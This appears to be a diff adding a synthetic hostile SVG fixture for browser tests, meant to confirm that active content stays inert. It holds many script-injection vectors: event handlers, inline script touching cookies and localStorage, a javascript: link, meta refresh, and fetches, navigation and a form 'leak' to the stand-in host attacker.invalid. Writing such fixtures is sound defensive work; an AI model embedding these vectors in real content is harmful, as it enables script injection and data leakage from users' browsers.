@@ -1,0 +1,47 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Synthetic hostile SVG for browser tests. Every active part must stay inert. -->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="320" height="240" viewBox="0 0 320 240" onload="window.__hostileSvg = 'onload'; alert('onload')">
+  <script>
+    window.__hostileSvg = "script";
+    localStorage.setItem("hostile-svg", "1");
+    document.cookie = "hostile-svg=1";
+    alert("script");
+    fetch("https://attacker.invalid/script");
+    window.open("https://attacker.invalid/popup");
+    top.location = "https://attacker.invalid/navigation";
+  </script>
+  <script href="https://attacker.invalid/external.js"></script>
+  <style>
+    @import url("https://attacker.invalid/import.css");
+    @font-face { font-family: hostile; src: url("https://attacker.invalid/font.woff"); }
+    text { font-family: hostile, sans-serif; }
+    .remote { fill: url("https://attacker.invalid/paint.svg#p"); }
+  </style>
+  <rect width="320" height="240" fill="#175c41"/>
+  <circle cx="160" cy="70" r="40" fill="#f2c94c"/>
+  <text x="160" y="140" text-anchor="middle" fill="#ffffff" font-size="20">Inert SVG</text>
+  <image href="https://attacker.invalid/image.png" x="0" y="0" width="10" height="10"/>
+  <image xlink:href="https://attacker.invalid/xlink-image.png" x="10" y="0" width="10" height="10"/>
+  <use href="https://attacker.invalid/sprite.svg#icon"/>
+  <rect class="remote" x="20" y="0" width="10" height="10" style="filter: url('https://attacker.invalid/filter.svg#f')"/>
+  <a href="javascript:alert('javascript-link')"><rect id="javascript-link" x="10" y="160" width="90" height="30" fill="#2f80ed"/></a>
+  <rect id="click-handler" x="115" y="160" width="90" height="30" fill="#eb5757" onclick="alert('click')"/>
+  <set attributeName="opacity" to="1" begin="0s" onbegin="alert('onbegin')"/>
+  <foreignObject x="210" y="150" width="110" height="90">
+    <html xmlns="http://www.w3.org/1999/xhtml">
+      <head>
+        <meta http-equiv="refresh" content="0;url=https://attacker.invalid/refresh"/>
+        <link rel="stylesheet" href="https://attacker.invalid/link.css"/>
+      </head>
+      <body>
+        <form id="hostile-form" action="https://attacker.invalid/form" method="get">
+          <input name="leak" value="1"/>
+          <button id="hostile-submit" type="submit">Go</button>
+        </form>
+        <img src="https://attacker.invalid/foreign-image.png" onerror="alert('onerror')"/>
+        <iframe src="https://attacker.invalid/frame"></iframe>
+        <a id="popup-link" href="https://attacker.invalid/popup-link" target="_blank">Popup</a>
+      </body>
+    </html>
+  </foreignObject>
+</svg>
